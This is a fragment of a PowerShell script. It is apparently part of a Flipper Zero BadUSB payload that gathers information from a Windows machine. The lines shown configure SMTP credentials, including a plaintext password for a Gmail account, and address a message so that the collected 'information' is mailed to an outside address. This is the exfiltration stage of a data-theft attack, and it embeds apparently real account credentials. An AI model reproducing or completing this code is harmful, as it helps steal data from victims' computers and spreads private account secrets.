...
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('flipperzerowindowspass@gmail.com', 'Hank0515') #Email with which you want to send information
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'makdog0515@gmail.com' #Email in which you want to receice the information
$ReportEmail.To.Add('makdog0515@gmail.com') #Email in which you want to receive the information
